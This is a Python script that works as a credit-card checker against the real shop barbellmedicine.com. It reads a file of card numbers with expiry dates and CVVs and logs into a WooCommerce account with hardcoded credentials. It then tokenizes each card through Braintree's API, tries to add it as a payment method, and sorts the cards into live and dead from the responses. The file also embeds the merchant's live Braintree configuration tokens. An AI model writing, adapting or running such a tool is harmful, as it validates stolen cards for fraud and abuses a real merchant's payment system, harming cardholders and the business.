import requests
import requests
import re
import requests
import requests,time
import random
import requests
import re,json
import random
import time
import string
import base64
from bs4 import BeautifulSoup
from user_agent import *
import random
import string
import requests
import requests,user_agent,re,base64,json,random
file=input('Enter File Path: ')	
#webbrowser.open('https://t.me/g_r_7N')
print('-'*25)
li = 0
y= open(file,'r')
F = '\033[2;32m'
Z= '\033[2;31m'
for y in y:
	ccx = y.strip().split('\n')[0]
	c = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	acc = ['yagm@gmail.com', 'yagmurclll@gmail.com']
	email = random.choice(acc)
	print(email)
	user = user_agent.generate_user_agent()
	r = requests.session()
	headers = {'user-agent': user}
	response = r.post(
	    'https://www.barbellmedicine.com/my-account/add-payment-method/', headers=headers)
	nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
	print(nonce)
	data = {
	    'username': email,
	    'password': 'yasirbot#1#D12',
	    'woocommerce-login-nonce': nonce,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'login': 'Log in',
	}
	
	response = r.post(
	    'https://www.barbellmedicine.com/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	nonce=re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-AE,ar;q=0.9',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '77be8b5b-9e20-462e-912c-4f0f3f258ab8',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': c,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'billingAddress': {
	                    'postalCode': '10090',
	                    'streetAddress': '300 Darling St',
	                },
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	import requests
	headers = {'user-agent': user}
	
	data = {
	    'payment_method': 'braintree_cc',
	    'braintree_cc_nonce_key': tok,
	    'braintree_cc_device_data': '{"device_session_id":"2d604c5f520c2f897b9cbfd4841b8a5e","fraud_merchant_id":null,"correlation_id":"c2aa76b868e18b47da0467af129b6677"}',
	    'braintree_cc_3ds_nonce_key': '',
	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/5vpcsgbwr3rw39my/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/5vpcsgbwr3rw39my"},"merchantId":"5vpcsgbwr3rw39my","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"braintreeApi":{"accessToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTk2MzEyODgsImp0aSI6IjM1MWYxZTUwLWEyNzYtNGE0Zi04YmQ1LThkZDM1ZDY1NzExYyIsInN1YiI6IjV2cGNzZ2J3cjNydzM5bXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjV2cGNzZ2J3cjNydzM5bXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.AdmAHk7VpPeRLMalkdyD--sl6a8LHM-PLFoytwAFPIypHGpyETBEhlKHcY3zNmogH7YVonClBMhLvvO6JN6adA","url":"https://payments.braintree-api.com"},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","American Express","Discover","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Barbell Medicine","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTk2MzEyODgsImp0aSI6ImE3MTgyNDZhLWViYzMtNDFlYy1hY2MxLTJmOTc2YjRjMmY3OSIsInN1YiI6IjV2cGNzZ2J3cjNydzM5bXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjV2cGNzZ2J3cjNydzM5bXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.8OyCEghCJgeMno338gi9IAyZcP0v76eKjVUBhGrpIw0CbCWvyk7UBNAuOvRidaH11g0TY6ZunMO1gIz3ITfuTQ","paypalClientId":"AQLmwmACb3IQjDKpEznxbiLWzpZ0N5Z_xeFi8V_xLmhEJsP0_KLmkEQNg2bsGbqUZwfcQH1vcWlx0g9Q","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Barbell Medicine","clientId":"AQLmwmACb3IQjDKpEznxbiLWzpZ0N5Z_xeFi8V_xLmhEJsP0_KLmkEQNg2bsGbqUZwfcQH1vcWlx0g9Q","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"strengthmdgmailcom","payeeEmail":null,"currencyIsoCode":"USD"}}',
	    'woocommerce-add-payment-method-nonce': nonce,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	}
	
	response = r.post(
	    'https://www.barbellmedicine.com/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		#print(result) 
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			time.sleep(10)
			result = "try again"
		else:
			result = "Error"
			#print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'Invalid postal code' in result:
		print(f'{F}{ccx} | {result}')
	else:
		print(f'{Z}{ccx} | {result}')
		
		#print(text)
